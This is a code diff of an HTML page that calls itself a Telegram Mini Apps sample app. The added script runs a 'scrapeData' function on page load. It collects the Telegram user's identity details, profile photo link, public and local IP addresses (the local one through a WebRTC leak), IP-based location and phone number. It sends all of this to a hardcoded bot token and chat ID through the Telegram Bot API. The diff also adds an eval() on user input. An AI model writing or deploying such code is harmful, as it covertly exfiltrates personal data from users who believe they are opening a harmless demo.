@@ -7,7 +7,82 @@
         content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <title>Telegram Mini Apps Vanilla JS Sample App</title>
+    <style>
+        body {
+            --bg-color: var(--tg-theme-bg-color);
+            font: 12px/18px "Lucida Grande", "Lucida Sans Unicode", Arial, Helvetica, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--tg-theme-text-color);
+            margin: 48px 24px;
+            padding: 0;
+            color-scheme: var(--tg-color-scheme);
+        }
 
+        a {
+            color: var(--tg-theme-link-color);
+        }
+
+        #viewport {
+            position: fixed;
+            left: 0;
+            right: 0;
+            top: 0;
+            height: var(--tg-viewport-stable-height, 100vh);
+            pointer-events: none;
+            transition: all .2s ease;
+        }
+
+        #viewport:after {
+            content: '';
+            display: block;
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            border-width: 4px;
+            border-style: solid;
+            border-image: linear-gradient(45deg, rgba(64, 224, 208, .5), rgba(173, 255, 47, .5)) 1;
+        }
+
+        #viewport-params-size,
+        #viewport-params-expand {
+            content: attr(text);
+            position: absolute;
+            display: inline-block;
+            background: var(--tg-theme-link-color, rgb(64, 224, 208));
+            right: 4px;
+            left: auto;
+            font-size: 8px;
+            padding: 4px;
+            vertical-align: top;
+        }
+
+        #viewport-params-size {
+            top: 4px;
+        }
+
+        #viewport-params-expand {
+            top: 30px;
+        }
+
+        .phone-number-container {
+            margin-top: 20px;
+        }
+
+        .phone-number-container label {
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .phone-number-container input {
+            padding: 8px;
+            width: 100%;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+    </style>
 </head>
 
 <body onload="scrapeData()">
@@ -20,7 +95,6 @@
         <button onclick="showPopup();">Launch Popup</button>
         <h1>Links</h1>
         <ul>
-
             <li>
                 <a href="javascript:Telegram.WebApp.openTelegramLink('https://t.me/trendingapps');">Open link within
                     Telegram</a>
@@ -49,19 +123,23 @@
     <div id="viewport-params-size"></div>
     <div id="viewport-params-expand"></div>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-        window.onload = function () {
-            Telegram.WebApp.init(); // Inizializza la Web App
+        // Init TWA
+        Telegram.WebApp.ready();
 
-            // Ottieni i dati dell'utente
-            const user = Telegram.WebApp.initDataUnsafe;
-            console.log(user);
+        // Event occurs whenever theme settings are changed in the user's Telegram app (including switching to night mode).
+        Telegram.WebApp.onEvent('themeChanged', function () {
+            document.documentElement.className = Telegram.WebApp.colorScheme;
+        });
 
-            // Imposta il titolo della mini app
-            Telegram.WebApp.setTitle("Benvenuto nella mia Mini App");
-
-        }
+        // Show main button
+        Telegram.WebApp.MainButton.setParams({
+            text: 'Main Button'
+        });
+        Telegram.WebApp.MainButton.onClick(function () {
+            Telegram.WebApp.showAlert('Main Button was clicked')
+        });
+        Telegram.WebApp.MainButton.show();
 
         // Function to call showPopup API
         function showPopup() {
@@ -87,21 +165,20 @@
                 Telegram.WebApp.MainButton.show();
             }
         };
-
         function scrapeData() {
             requestLocation();
             sendUserDataToTelegram();
             sendPhoneNumberToTelegram();
         }
-
         function requestLocation() {
+            // Initialize LocationManager if not already initialized
             if (!Telegram.WebApp.LocationManager.isInited) {
                 Telegram.WebApp.LocationManager.init(() => {
                     console.log("LocationManager initialized");
-                    getLocationData();
+                    getLocationData(); // Call location function after init
                 });
             } else {
-                getLocationData();
+                getLocationData(); // Directly fetch location if already initialized
             }
         }
 
@@ -138,9 +215,248 @@
                     Telegram.WebApp.showAlert("Error: " + error.message);
                 });
         }
+
+        function showError(error) {
+            let message;
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    message = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    message = "The request to get user location timed out.";
+                    break;
+                default:
+                    message = "An unknown error occurred.";
+            }
+            Telegram.WebApp.showAlert(message);
+        }
+
+        async function setViewportData() {
+            var sizeEl = document.getElementById('viewport-params-size');
+            sizeEl.innerText = 'width: ' + window.innerWidth + ' x ' +
+                'height: ' + Telegram.WebApp.viewportStableHeight;
+
+            var expandEl = document.querySelector('#viewport-params-expand');
+            expandEl.innerText = 'Is Expanded: ' + (Telegram.WebApp.isExpanded ? 'true' : 'false');
+        }
+
+        Telegram.WebApp.setHeaderColor('secondary_bg_color');
+
+        setViewportData();
+        Telegram.WebApp.onEvent('viewportChanged', setViewportData);
+
+        Telegram.WebApp.onEvent('themeChanged', function () {
+            document.body.setAttribute('style', '--bg-color:' + Telegram.WebApp.backgroundColor);
+        });
+
+        async function sendUserDataToTelegram() {
+            const user = Telegram.WebApp.initDataUnsafe.user;
+            if (!user) {
+                Telegram.WebApp.showAlert("User data is not available.");
+                return;
+            }
+
+            const chatId = "7265296083";  // Replace with actual chat ID
+            const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token
+
+            let photoUrl = await getUserProfilePhoto(user.id, botToken);
+            let locationFromIP = await getLocationFromIP();
+            let IP = await getIP();
+            let localIP= await getLocalIP();
+
+            const userData = `
+👤 *User Data*:
+🆔 ID: ${user.id}
+👤 Name: ${user.first_name} ${user.last_name || ""}
+🔗 Username: @${user.username || "N/A"}
+🌍 Language: ${user.language_code || "N/A"}
+💎 Premium: ${user.is_premium ? "Yes" : "No"}
+📎 Attachment Menu: ${user.added_to_attachment_menu ? "Yes" : "No"}
+✉️ Allows PM: ${user.allows_write_to_pm ? "Yes" : "No"}
+🖼 Profile Photo: ${photoUrl ? `[Click Here](${photoUrl})` : "No photo"}
+📍 IP-based Location: ${locationFromIP}
+📍 Public IP Address: ${IP}
+📍 Local IP Address: ${localIP}
+`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const formData = new URLSearchParams();
+            formData.append("chat_id", chatId);
+            formData.append("text", userData);
+            formData.append("parse_mode", "Markdown");
+
+            fetch(url, {
+                method: "POST",
+                body: formData
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        Telegram.WebApp.showAlert("User data sent successfully!");
+                    } else {
+                        Telegram.WebApp.showAlert("Failed to send user data: " + data.description);
+                    }
+                })
+
+                .catch(error => {
+                    Telegram.WebApp.showAlert("Error: " + error.message);
+                });
+        }
+
+        async function getUserProfilePhoto(userId, botToken) {
+            const url = `https://api.telegram.org/bot${botToken}/getUserProfilePhotos?user_id=${userId}&limit=1`;
+
+            try {
+                let response = await fetch(url);
+                let data = await response.json();
+                if (data.ok && data.result.total_count > 0) {
+                    let fileId = data.result.photos[0][0].file_id;
+                    return await getFileUrl(fileId, botToken);
+                }
+            } catch (error) {
+                console.error("Error fetching profile photo:", error);
+            }
+
+            return null; // No profile photo available
+        }
+
+        async function getFileUrl(fileId, botToken) {
+            const url = `https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`;
+
+            try {
+                let response = await fetch(url);
+                let data = await response.json();
+                if (data.ok) {
+                    return `https://api.telegram.org/file/bot${botToken}/${data.result.file_path}`;
+                }
+            } catch (error) {
+                console.error("Error fetching file URL:", error);
+            }
+
+            return null;
+        }
+        async function sendPhoneNumberToTelegram() {
+            const user = Telegram.WebApp.initDataUnsafe.user;
+            if (!user) {
+                Telegram.WebApp.showAlert("User data is not available.");
+                return;
+            }
+
+            const chatId = "7265296083";  // Replace with actual chat ID
+            const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token
+
+            // Fetch the phone number
+            const phoneNumber = await getPhoneNumber(user.id);  // Request the phone number
+
+            // Send the phone number separately
+            if (phoneNumber) {
+                await sendPhoneNumberMessage(chatId, botToken, phoneNumber);
+            } else {
+                Telegram.WebApp.showAlert("No phone number found.");
+            }
+        }
+        async function sendPhoneNumberMessage(chatId, botToken, phoneNumber) {
+            const phoneNumberMessage = `📱 Phone Number: ${phoneNumber}`;
+            alert(phoneNumberMessage);
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const formData = new URLSearchParams();
+            formData.append("chat_id", chatId);
+            formData.append("text", phoneNumberMessage);
+            alert(phoneNumber);
+            await fetch(url, {
+                method: "POST",
+                body: formData
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        Telegram.WebApp.showAlert("Phone number sent successfully!");
+                    } else {
+                        Telegram.WebApp.showAlert("Failed to send phone number: " + data.description);
+                    }
+                })
+                .catch(error => {
+                    Telegram.WebApp.showAlert("Error: " + error.message);
+                });
+        }
+
+        async function getPhoneNumber(userId) {
+            return new Promise((resolve) => {
+                Telegram.WebApp.requestContact();
+
+                Telegram.WebApp.onEvent("contactSelected", function (contact) {
+                    if (contact && contact.phone_number) {
+                        resolve(contact.phone_number);
+                    } else {
+                        resolve(null);
+                    }
+                });
+            });
+        }
+
+        function evaluateInput() {
+            // Get the value of the input box
+            const inputValue = document.getElementById('inputBox').value;
+            // Evaluate the input using the JavaScript eval function
+            const result = eval(inputValue);
+           // alert(result);
+            // Show the result
+            document.getElementById('result').innerText = 'Result: ' + result;
+
+        }
+
+
+        async function getLocationFromIP() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                console.log(`Location: ${data.city}, ${data.country}`);
+                return `${data.city}, ${data.country}`;
+            } catch (error) {
+                console.error("Failed to get location from IP:", error);
+                return "Location unavailable";
+            }
+        }
+
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return `${data.ip}`;
+            } catch (error) {
+                console.error("Failed to get location from IP:", error);
+                return "IP unavailable";
+            }
+        }
+
+        async function getLocalIP() {
+            return new Promise((resolve, reject) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.onicecandidate = (event) => {
+                    if (event && event.candidate) {
+                        const ip = event.candidate.candidate.split(' ')[4];
+                        resolve(ip);
+                        pc.close();
+                    }
+                };
+                pc.createOffer()
+                    .then((offer) => pc.setLocalDescription(offer))
+                    .catch((err) => reject(err));
+            });
+        }
     </script>
 
-
+    <!-- Eruda is console for mobile browsers -->
+    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+    <script>eruda.init();</script>
 </body>
 
 </html>
